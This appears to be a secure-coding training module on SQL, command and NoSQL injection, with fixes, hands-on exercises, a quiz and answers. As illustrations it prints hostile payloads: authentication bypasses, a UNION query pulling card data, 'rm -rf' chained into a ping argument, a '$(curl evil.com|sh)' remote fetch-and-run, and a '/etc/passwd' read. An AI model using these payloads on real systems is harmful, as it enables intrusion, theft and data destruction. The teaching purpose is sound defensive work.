# Module 01: Injection Attacks

## Why this matters

Injection has been at or near the top of every OWASP list for two decades, and
it's still where catastrophic breaches come from — because it turns a single
unescaped input into full control of your database or your server. The
mechanism is brutally simple: your code builds a command (a SQL query, a shell
command, a database filter) by *gluing strings together*, and some of those
strings came from the user. The interpreter on the other end can't tell which
characters you meant as *code* and which the user meant as *data* — so an
attacker sends data that the interpreter reads as code. One `'; DROP TABLE
users; --` in the wrong place and the query the interpreter runs is not the
query you wrote.

This is module 00's trust-boundary model at its sharpest: untrusted input
crossing into an interpreter. The reason this matters so much is the payoff —
SQL injection can dump every password hash, every email, every credit-card
token in your database (and modern SQLi often escalates to running OS commands
on the DB host); command injection is instant remote code execution. The good
news, and the through-line of this whole module: **the entire class has one
root cause and therefore one real fix.** Learn the fix once and you close SQL,
command, and NoSQL injection together. The rest is recognizing the shapes.

## Concepts

### The one root cause: mixing code and data on the same channel

Every injection vulnerability is the same bug wearing different clothes. You
send an interpreter a string that is *supposed* to be part code (structure you
wrote) and part data (values from the user), on a single channel, and you trust
the interpreter to figure out where one ends and the other begins. It can't —
so it parses attacker-supplied data as structure.

```python
# The bug, in its purest form: user input concatenated into a command string.
query = "SELECT * FROM users WHERE name = '" + user_input + "'"
#                                              ^^^^^^^^^^^^ data glued into code
```

If `user_input` is `alice`, the query is fine. If it's `' OR '1'='1`, the query
becomes `SELECT * FROM users WHERE name = '' OR '1'='1'` — always true, returns
every user. The interpreter did exactly what the string told it to; the string
just wasn't the one you thought you wrote.

**The fix, universally:** send code and data on *separate channels* so the
interpreter never has to guess. For SQL that's **parameterized queries** (a.k.a.
prepared statements): you send the query *with placeholders* and the values
*separately*, and the driver guarantees the values are only ever treated as
data — never parsed as SQL. For shell commands it's passing an **argument
vector** instead of a shell string. For NoSQL it's passing **typed query
objects** instead of interpolated strings. Same principle every time: **never
build a command by concatenating untrusted input.**

### SQL injection — the canonical case

SQL injection (SQLi) is injection into a SQL query. The classic demonstrations:

- **Authentication bypass.** `WHERE user='$u' AND pass='$p'` with `u = admin'--`
  becomes `WHERE user='admin'--' AND pass='...'` — the `--` comments out the
  password check, logging you in as admin with no password.
- **Data exfiltration via `UNION`.** Appending `UNION SELECT credit_card, cvv
  FROM payments` to a vulnerable `SELECT` splices another table's rows into the
  results the app happily renders.
- **Blind SQLi.** Even when the app shows no query output, an attacker infers
  data one bit at a time from *behavioral* differences — a boolean that changes
  the page (`AND 1=1` vs `AND 1=2`) or a time delay (`AND SLEEP(5)`) that reveals
  whether a condition was true. Slow, fully automatable (sqlmap), and just as
  total.
- **Escalation.** On many databases SQLi reaches beyond data — writing files,
  calling stored procedures, and on misconfigured setups executing OS commands
  on the DB host. "It's just a search box" is how the whole company leaks.

The fix is parameterized queries — every mainstream driver supports them, and
they're both safer *and* faster (the DB caches the query plan):

```python
# VULNERABLE — f-string builds the SQL from user input
cur.execute(f"SELECT * FROM users WHERE email = '{email}'")

# FIXED — placeholder + separate values tuple; driver treats email as pure data
cur.execute("SELECT * FROM users WHERE email = %s", (email,))
#                                            ^^ psycopg/pymysql;  sqlite3 uses ?
```

The placeholder value is *never* parsed as SQL — feed it `' OR '1'='1` and the
driver looks for a user whose email is literally the string `' OR '1'='1`, finds
none, done. The attack simply has nowhere to land.

### Command injection — from web request to shell

Command injection is injection into an **OS shell**. It appears whenever you
build a shell command string from user input — the "let me just call
`ImageMagick`/`ffmpeg`/`ping` with the user's value" trap:

```python
import os, subprocess
host = request.query_params["host"]

# VULNERABLE — user input in a shell string; shell metacharacters are live
os.system(f"ping -c 1 {host}")
subprocess.run(f"ping -c 1 {host}", shell=True)   # same bug: shell=True
```

With `host = 8.8.8.8; rm -rf / --no-preserve-root` (or `$(curl evil.com|sh)`,
or `; cat /etc/passwd`), the shell runs your `ping` *and then* the attacker's
command — this is direct remote code execution, the worst outcome on the list.
The `;`, `|`, `&&`, `$()`, and backticks are all shell metacharacters the shell
interprets as structure.

The fix mirrors SQL: **don't invoke a shell, and pass arguments as a list** so
the OS treats each element as one literal argument, never as shell syntax:

```python
# FIXED — no shell; argv list; `host` can never be more than one argument
subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
```

With the list form there is no shell to interpret `;` or `$()` — `host` is
handed to `ping` as a single opaque argument. (Better still for `ping`-style
needs: avoid shelling out at all and use a library. And *always* validate that
`host` looks like a hostname/IP too — defense in depth.)

### NoSQL injection — same disease, different query language

"We use MongoDB, so no SQL injection" is a dangerous non-sequitur. NoSQL
databases have their own query languages, and building queries from untrusted
input is just as exploitable — often *easier*, because the input is frequently
JSON that maps directly onto query operators. The classic MongoDB
authentication bypass:

```python
# VULNERABLE — the request body (JSON) is passed straight into the query
creds = await request.json()      # attacker sends {"user":"admin","pass":{"$gt":""}}
user = db.users.find_one({"username": creds["user"], "password": creds["pass"]})
```

The attacker sends `{"$gt": ""}` where a password string was expected. Mongo
reads `{"password": {"$gt": ""}}` as "password greater than empty string" —
true for everyone — and logs them in as admin. No quotes, no `--`, just a query
*operator* smuggled in as data. Other operators (`$ne`, `$regex`,
`$where` with JS) extend the attack.

Fixes: **enforce types before querying** (a password must be a `str`, not a
dict — Pydantic/schema validation rejects `{"$gt": ""}` outright), and use query
builders/ODMs that treat values as values. NoSQL injection is really "you let
untrusted structured input *become* your query structure" — validate the shape,
and cast values to the types you expect.

### ORMs as mitigation — helpful, not magic

An ORM (SQLAlchemy, Django ORM, etc.) parameterizes queries *for you*: when you
write `session.query(User).filter(User.email == email)`, the ORM emits a
placeholder and binds `email` as data. Used normally, an ORM makes the common
case safe by default — a real reason to prefer them. **But an ORM is not an
injection force field:**

- The moment you drop to **raw SQL** (`session.execute(text(...))`,
  `.raw()`, `.extra()`), you're back to manual parameterization — and people
  reflexively f-string it.
- Some ORM surfaces pass strings through to SQL: dynamic **`order_by` /
  column names** built from user input (`order_by(text(user_column))`),
  `filter` with raw SQL fragments. Identifiers (table/column names) *can't* be
  parameterized — placeholders only bind *values* — so dynamic identifiers must
  be **allowlisted**, never interpolated.

```python
# VULNERABLE even inside an ORM — raw SQL with an f-string
session.execute(text(f"SELECT * FROM users WHERE email = '{email}'"))
# FIXED — bound parameter
session.execute(text("SELECT * FROM users WHERE email = :email"), {"email": email})

# Column/identifier from user input can't be a placeholder → ALLOWLIST it
SORTABLE = {"name", "created_at", "email"}          # the only legal values
col = user_sort if user_sort in SORTABLE else "created_at"   # never interpolate raw
```

The takeaway: parameterize *values* everywhere, allowlist *identifiers*, and
don't assume "we use an ORM" ends the conversation.

### Validation is a useful layer, but not the fix

Input validation (rejecting weird characters, length caps, type checks) is
worthwhile defense in depth and it's how you stop NoSQL operator smuggling — but
it is **not** the primary fix for SQL/command injection, and treating it as such
is a classic mistake. Blocklisting "dangerous characters" (stripping quotes,
banning `;`) is a losing game: encodings, alternate syntaxes, and cases you
didn't think of slip through, and legitimate data (the name *O'Brien*, a
password with a quote) breaks. The robust fix is *structural* — separate code
from data (parameterize) so the input's *content* can't change the command's
*structure*. Validate for correctness and as an extra layer; parameterize for
security.

## Command reference

| Pattern | Purpose | Snippet |
|---|---|---|
| Parameterized query (DB-API) | kill SQLi — values as data | `cur.execute("... WHERE id=%s", (id,))` |
| sqlite placeholder | same, stdlib | `cur.execute("... WHERE id=?", (id,))` |
| `text()` + bound params | safe raw SQL in SQLAlchemy | `execute(text("...:x"), {"x": v})` |
| ORM filter | auto-parameterized | `query(User).filter(User.id == id)` |
| Identifier allowlist | column/table from user input | `col = c if c in ALLOWED else default` |
| `subprocess.run([...], shell=False)` | kill command injection | argv list, no shell |
| Pydantic typed model | reject NoSQL operator smuggling | `password: str` rejects `{"$gt":""}` |
| Least-privilege DB user | limit blast radius | app user can't `DROP`/read other schemas |

A FastAPI endpoint doing all three safely — the module in one snippet:

```python
import subprocess
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from sqlalchemy import text

router = APIRouter()
SORTABLE = {"name", "created_at"}          # identifier allowlist

class Login(BaseModel):
    username: str                          # typed → NoSQL operator smuggling can't fit
    password: str

@router.post("/login")
def login(body: Login, sort: str = "created_at"):
    col = sort if sort in SORTABLE else "created_at"     # allowlist the identifier
    row = db.execute(                                    # parameterize the VALUE
        text(f"SELECT id, pw_hash FROM users WHERE username = :u ORDER BY {col}"),
        {"u": body.username},
    ).first()
    # ... verify password hash (track 03) ...

@router.get("/diagnostics/ping")
def ping(host: str):
    if not host.replace(".", "").isalnum():              # validate shape (defense in depth)
        raise HTTPException(400, "bad host")
    out = subprocess.run(["ping", "-c", "1", host],      # argv list, no shell
                         capture_output=True, timeout=5, shell=False)
    return {"ok": out.returncode == 0}
```

## Hands-on exercises

Continue in `sec-track`. Use SQLite (stdlib `sqlite3`) or Postgres via
SQLAlchemy — both support placeholders. Seed a `users` table with a couple of
rows including a fake `pw_hash` and a `secret` column.

### 1. Build the vulnerable query and break it yourself

Write a `/search?name=` endpoint that runs
`f"SELECT * FROM users WHERE name = '{name}'"`. Query it normally, then send
`name=' OR '1'='1`. Expected: the second request returns *every* row. You've
just performed SQL injection against your own app — internalize how little it
took.

### 2. Authentication bypass with a comment

Add a login query `f"SELECT * FROM users WHERE user='{u}' AND pass='{p}'"`.
Log in as a normal user, then send `u=admin'--` with any password. Expected:
you're "logged in" as admin because `--` commented out the password check.

### 3. Fix it with parameterization, then re-attack

Rewrite both queries with placeholders and a values tuple/dict. Replay the
exact attacks from exercises 1 and 2. Expected: `' OR '1'='1` now returns *no*
rows (there's no user literally named that), and `admin'--` fails — the payloads
have nowhere to land because they're treated as data, not SQL.

### 4. Exfiltrate with UNION (then watch parameterization stop it)

On the vulnerable `/search`, craft a `UNION SELECT` payload that pulls the
`secret` column into the visible results (match the column count/types). Confirm
you can read data the endpoint never meant to expose. Then confirm the
parameterized version makes the `UNION` payload inert. Expected: you understand
SQLi reads *arbitrary* tables, not just the intended one.

### 5. Command injection to RCE, then the argv fix

Write the vulnerable `subprocess.run(f"ping -c 1 {host}", shell=True)` endpoint.
Send `host=127.0.0.1; id` (or `; whoami`) and observe your extra command run.
Now rewrite it as `subprocess.run(["ping","-c","1",host], shell=False)` and
replay. Expected: the injected `; id` runs in the vulnerable version and is
treated as a literal (failed) hostname argument in the fixed one.

### 6. NoSQL operator smuggling (or simulate it)

If you have MongoDB, build the vulnerable `find_one({"username": u, "password":
p})` login and send `{"password": {"$gt": ""}}` to bypass it. No Mongo? Simulate
the exact bug: accept a raw dict body and build any query from it, then fix it by
declaring a Pydantic model with `username: str, password: str`. Expected: the
typed model rejects the `{"$gt": ""}` payload with a 422 before it can become a
query operator.

### 7. Find the injection an ORM didn't save you from

Take a SQLAlchemy (or Django) query and introduce a user-controlled
`order_by`/column via string interpolation (`order_by(text(user_col))`). Inject a
payload through it. Then fix it with an identifier allowlist. Expected: proof
that "we use an ORM" is not a complete defense — dynamic identifiers still need
allowlisting because placeholders bind values, not identifiers.

### 8. Least-privilege blast radius

Create a DB user for the app that can only `SELECT`/`INSERT`/`UPDATE` on its own
tables — not `DROP`, not read other schemas. Re-run a destructive injection
attempt (e.g. a `DROP TABLE` payload) through the *still-vulnerable* endpoint.
Expected: the injection "succeeds" syntactically but the DB rejects the
privileged action — demonstrating defense in depth limits damage even when the
primary control fails.

### 9. Diagnose and fix: the reporting endpoint

Audit this endpoint for *every* injection issue and fix them all.

```python
@app.get("/report")
def report(request):
    table = request.query_params["table"]      # e.g. "orders"
    status = request.query_params["status"]    # e.g. "shipped"
    fmt = request.query_params["fmt"]           # e.g. "csv"
    rows = cur.execute(
        f"SELECT * FROM {table} WHERE status = '{status}'"
    ).fetchall()
    os.system(f"convert-report --out /tmp/report.{fmt}")
    return {"rows": rows}
```

<details>
<summary>Solution</summary>

Three separate injections. (1) **`status` value** is f-stringed into SQL →
classic SQLi; fix with a placeholder: `... WHERE status = :status`,
`{"status": status}`. (2) **`table` is an identifier**, which *cannot* be
parameterized (placeholders bind values, not table names) → an f-string here is
still SQLi (`table = users; --` etc.); fix with an **allowlist**:
`if table not in {"orders","invoices"}: raise HTTPException(400)`. (3)
**`os.system(f"...{fmt}")`** is command injection (`fmt=csv; rm -rf ~`) → drop
the shell entirely: `subprocess.run(["convert-report","--out",f"/tmp/report.{fmt}"],
shell=False)` *and* allowlist `fmt` to `{"csv","pdf"}` since it lands in a
filename. Corrected shape: allowlist the identifier and the format, parameterize
the value, never invoke a shell. (Bonus: run the query as a least-privilege DB
user so even a missed injection can't `DROP`.)

</details>

## Independent challenge

No code given. Take an endpoint from `sec-track` (or build a `/products/search`
that filters by category, sorts by a user-chosen column, and paginates) and make
it **injection-proof end to end** while it still does everything dynamically:
a user-supplied *value* filter (parameterize), a user-chosen *sort column* and
*direction* (allowlist — identifiers can't be placeholders), and a
user-controlled *page size* (validate/cast to a bounded int). Then add one
endpoint that must shell out to an external tool and make *that* injection-proof
(argv list, no shell, validated inputs). Finally, apply module 00's trust-
boundary lens: write a short note naming, for each input, which interpreter it
reaches and which technique neutralizes it there — and explain why input
validation alone would *not* have been a sufficient fix for the value filter.

<details>
<summary>Hint</summary>

The distinction that makes or breaks this challenge is **value vs identifier**.
Placeholders/bind parameters only ever protect *values* (the things in a
`WHERE x = ?`); a table name, column name, or sort direction is part of the
query's *structure* and the driver won't let you bind it — so the only safe way
to make those dynamic is to map user input to a fixed **allowlist** of known-
good literals and interpolate only the allowlisted result, never the raw input.
For why validation alone is insufficient on the value filter: a blocklist of
"bad characters" is bypassable (encodings, cases you missed) and breaks
legitimate data like the name *O'Brien* — parameterization is *structural*, so
the input's content can never alter the command's structure regardless of what
characters it contains.

</details>

## Common mistakes & troubleshooting

- **Building any command by concatenating/f-stringing untrusted input.** The
  root cause of the entire class. Parameterize values; allowlist identifiers;
  pass argv lists to subprocess.
- **Assuming an ORM makes you injection-proof.** Raw SQL (`text()`, `.raw()`),
  dynamic `order_by`/column names, and raw filter fragments all re-open the
  door. Parameterize and allowlist even inside an ORM.
- **Trying to parameterize a table/column name.** Placeholders bind *values*
  only. Dynamic identifiers must be allowlisted against a fixed set.
- **Relying on input validation / character blocklists as the fix.** Bypassable
  and breaks real data (O'Brien). Validation is defense in depth; structural
  separation (parameterize) is the fix.
- **`shell=True` or `os.system` with any user input.** Direct RCE via shell
  metacharacters (`;`, `|`, `$()`). Use `subprocess.run([...], shell=False)`.
- **"We use NoSQL, so no injection."** NoSQL query languages inject too —
  operator smuggling (`{"$gt": ""}`). Enforce types (Pydantic) so a password
  can't arrive as a query operator.
- **Running the app as a superuser DB account.** Turns a small injection into
  total loss. Grant least privilege so a missed bug can't `DROP` or read other
  schemas.

## Checkpoint quiz

Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.

1. State the single root cause shared by SQL, command, and NoSQL injection, and
   the single structural fix.
2. Why is a parameterized query safe against `' OR '1'='1` where an f-stringed
   query is not — what does the driver do differently?
3. You need a user-controlled sort column. Why can't you parameterize it, and
   what do you do instead?
4. Why is `subprocess.run(cmd, shell=True)` dangerous with user input, and what's
   the fix?
5. Show the shape of a NoSQL authentication-bypass payload and explain why it
   works and how a typed model stops it.
6. "We use an ORM, so we're safe from SQLi." Give two ways that's false.
7. Why is input validation (blocklisting bad characters) not the primary fix for
   SQLi, and what is validation good for here?

<details>
<summary>Answers</summary>

1. Root cause: **untrusted data and command code travel on the same channel, so
   the interpreter parses attacker data as structure/code.** Fix: **separate code
   from data** — parameterized queries for SQL, argv lists (no shell) for
   commands, typed query objects for NoSQL.
2. The driver sends the query template (with a placeholder) and the value
   *separately*; the value is bound as pure data and never parsed as SQL. So
   `' OR '1'='1` becomes a search for a user literally named that string, which
   matches nothing — the payload can't alter the query's structure.
3. Placeholders bind *values*, not *identifiers* (table/column names are part of
   the query structure), so the driver won't parameterize a column name.
   Instead map the user input to a fixed **allowlist** of permitted column names
   and interpolate only the allowlisted literal.
4. `shell=True` runs the string through a shell that interprets metacharacters
   (`;`, `|`, `$()`), so `host; rm -rf /` executes the attacker's command — RCE.
   Fix: `subprocess.run(["ping","-c","1",host], shell=False)` so each element is
   a literal argument and there's no shell to interpret metacharacters.
5. `{"username":"admin","password":{"$gt":""}}` — the attacker sends a query
   *operator* where a string was expected; Mongo reads "password greater than
   empty string," true for all, bypassing the check. A Pydantic model with
   `password: str` rejects the dict with a 422 before it can become an operator.
6. (a) Dropping to raw SQL (`text()`, `.raw()`, `.extra()`) re-introduces manual
   concatenation. (b) Dynamic identifiers (`order_by`/column names from user
   input) can't be parameterized and are often interpolated — still injectable.
7. Blocklisting characters is bypassable (encodings, alternate syntax, cases you
   missed) and breaks legitimate data (O'Brien, quotes in passwords). The real
   fix is structural (parameterize) so content can't change structure.
   Validation is good for correctness and as a defense-in-depth layer — and it's
   the actual fix for NoSQL operator smuggling (enforce types/shape).

</details>

## Next

[02-xss-and-csrf](../02-xss-and-csrf/README.md) — injection continues into the
*browser*: cross-site scripting (XSS) is injection where the interpreter is the
browser's HTML/JS parser instead of your database. Paired with CSRF, it's how
attackers turn your own users' browsers against them. That module also carries
this track's first **cumulative review** (modules 00-02), taken closed-book.
